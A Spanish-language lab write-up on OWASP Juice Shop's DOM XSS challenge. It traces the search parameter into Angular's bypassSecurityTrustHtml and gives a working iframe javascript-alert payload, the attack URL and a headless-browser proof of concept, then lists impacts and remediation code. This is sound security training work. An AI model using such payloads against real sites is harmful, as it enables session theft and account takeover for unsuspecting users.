<div align="center">

# 🧨 DOM XSS — Búsqueda
### OWASP Juice Shop · Cross-Site Scripting DOM-Based

![Status](https://img.shields.io/badge/Status-Verificado-00ff88?style=for-the-badge&logo=statuspage&logoColor=white)
![Severity](https://img.shields.io/badge/Severidad-Alta-ff6b00?style=for-the-badge)
![Type](https://img.shields.io/badge/Tipo-DOM%20XSS-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)

</div>

---

> **Hallazgo:** el parámetro `q` del buscador es tomado de `location.search` y asignado a `bypassSecurityTrustHtml()` de Angular sin sanitización, permitiendo inyección y ejecución de HTML/JavaScript arbitrario en el navegador de cualquier usuario que visite la URL maliciosa.

> [!WARNING]
> Uso exclusivo en laboratorio controlado (`http://localhost:3000`). No reproducir en sistemas sin autorización explícita.

---

## 📋 Resumen del Hallazgo

| Campo | Detalle |
|-------|---------|
| **Aplicación** | OWASP Juice Shop |
| **Ruta** | `/#/search?q=<payload>` |
| **Parámetro** | `q` (query string) |
| **Tipo** | DOM-Based XSS |
| **Severidad** | 🟠 Alta |
| **CVSS v3** | 7.4 · AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| **Autenticación** | No requerida |
| **Estado** | ✅ Verificado |

---

## 🔍 Descripción

La función `filterTable()` del componente de búsqueda lee `q` desde `route.snapshot.queryParams` y lo asigna usando `sanitizer.bypassSecurityTrustHtml()`. Esta API de Angular deshabilita explícitamente la sanitización, marcando el valor como HTML confiable. El navegador renderiza el contenido sin restricciones, permitiendo ejecución de JavaScript via tags como `<iframe src="javascript:...">`.

> [!NOTE]
> Al ser DOM-based, el payload nunca llega al servidor — toda la explotación ocurre en el cliente. Esto dificulta detección por WAF o logs de servidor.

---

## 🔬 Análisis Técnico

### `[01]` Código vulnerable (frontend minificado)

```javascript
filterTable() {
  let e = this.route.snapshot.queryParams.q
  // ...
  this.searchValue = this.sanitizer.bypassSecurityTrustHtml(e)
}
```

### `[02]` Flujo de datos

```
URL: /#/search?q=<payload>
      │
      ▼
route.snapshot.queryParams.q   ← SOURCE (controlado por atacante)
      │
      ▼
bypassSecurityTrustHtml(e)     ← sanitización DESHABILITADA
      │
      ▼
[innerHTML binding]            ← SINK (renderiza HTML raw)
      │
      ▼
JavaScript ejecutado en navegador
```

### `[03]` Explicación del Flujo (Paso a Paso)

Este flujo es una "crónica de una vulnerabilidad anunciada":

- La Entrada (SOURCE):
  El atacante envía una URL que contiene el payload en el parámetro `q`. Como es un DOM-based XSS, el valor después del `?` o del `#` es leído directamente por el código JavaScript que corre en el cliente, no necesariamente por el servidor.

- La Captura:
  `route.snapshot.queryParams.q` toma ese texto directamente de la barra de direcciones y lo guarda en una variable. En este punto, el payload es solo una cadena de texto "inofensiva".

- El Error Fatal (Bypass):
  `bypassSecurityTrustHtml(e)` es una función de Angular diseñada específicamente para decir: "Confío en este contenido, no lo limpies".

  Concepto clave: Normalmente, los frameworks modernos "escapan" el código (convierten `<` en `&lt;`) para que no se ejecute. Al usar esta función, el programador está abriendo la puerta y quitando el "escudo" de seguridad.

- La Ejecución (SINK):
  `[innerHTML binding]` es el punto de impacto. El framework toma el código que acabamos de marcar como "confiable" y lo inserta en el DOM de la página.

- Resultado:
  El navegador ve un nuevo elemento `<iframe>` en el documento, intenta procesar su atributo `src`, reconoce el protocolo de JavaScript y ejecuta el `alert`.

---

## 🧪 Reproducción

### `[01]` Payload válido

```html
<iframe src="javascript:alert(`xss`)">
```

### `[02]` URL de ataque

```text
http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(`xss`)%22%3E
```

### `[03]` PoC — headless verification

```bash
chromium --headless --disable-gpu --no-sandbox \
  --virtual-time-budget=5000 \
  --dump-dom \
  'http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(`xss`)%22%3E'
```

### `[04]` Resultado observado

- DOM renderiza el `<iframe>` con `src="javascript:alert('xss')"`
- JavaScript ejecuta en contexto de `localhost:3000`
- Challenge `DOM XSS` → `solved: true`

---

## ✅ Validación del Challenge

```bash
python3 - <<'PY'
import json, urllib.request
ch = json.load(urllib.request.urlopen('http://localhost:3000/api/Challenges/'))['data']
print([c for c in ch if c['name'] == 'DOM XSS'][0]['solved'])
PY
```

Salida esperada: `True`

---

## 🔁 Flujo con Caido

1. Abrir app en navegador proxied
2. Ir a la sección de búsqueda
3. Observar parámetro `q` en URL desde `HTTP History`
4. Navegar directamente con payload en URL o interceptar y modificar
5. Verificar ejecución en navegador y challenge solved

---

## 💥 Impacto

- **Robo de sesión**: `document.cookie` accesible si no hay `HttpOnly`
- **Phishing UI**: modificar DOM completo para simular login falso
- **Keylogging**: capturar inputs del usuario en tiempo real
- **Acciones en nombre del usuario**: ejecutar requests autenticados con credenciales activas
- **Distribución**: cualquier URL enviada a una víctima con sesión activa desencadena el ataque

> [!IMPORTANT]
> DOM XSS no deja rastro en logs del servidor. El ataque completo ocurre en el cliente, dificultando detección y forense.

---

## 🔧 Remediación

| Medida | Descripción |
|--------|-------------|
| **Eliminar bypassSecurityTrustHtml** | Usar `sanitizer.sanitize()` o binding de texto plano `{{ variable }}` |
| **DomSanitizer correcto** | Si necesitas HTML, usar `sanitizer.sanitize(SecurityContext.HTML, value)` |
| **Content-Security-Policy** | Implementar CSP estricto con `script-src 'self'` |
| **HttpOnly en cookies** | Prevenir acceso a tokens de sesión via JavaScript |

```typescript
// ❌ Vulnerable
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(e);

// ✅ Seguro — texto plano
this.searchValue = e;  // usar con {{ searchValue }} en template

// ✅ Seguro — si HTML requerido
this.searchValue = this.sanitizer.sanitize(SecurityContext.HTML, e);
```

---

## 🔗 Referencias

- [PortSwigger — DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [Angular Security — Sanitization](https://angular.io/guide/security#sanitization-and-security-contexts)
- [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)
